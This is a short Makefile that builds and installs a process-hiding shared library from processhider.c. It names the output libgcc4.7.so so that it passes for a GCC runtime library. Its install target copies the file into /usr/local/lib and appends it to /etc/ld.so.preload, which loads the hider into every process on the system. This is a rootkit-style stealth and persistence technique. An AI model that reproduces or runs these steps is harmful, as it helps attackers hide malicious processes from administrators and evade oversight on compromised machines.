all: libprocesshider.so

libprocesshider.so: processhider.c
	gcc -Wall -fPIC -shared -o libgcc4.7.so processhider.c -ldl

install:
	cp libgcc4.7.so /usr/local/lib
	echo /usr/local/lib/libgcc4.7.so >> /etc/ld.so.preload

.PHONY clean:
	rm -f libgcc4.7.so
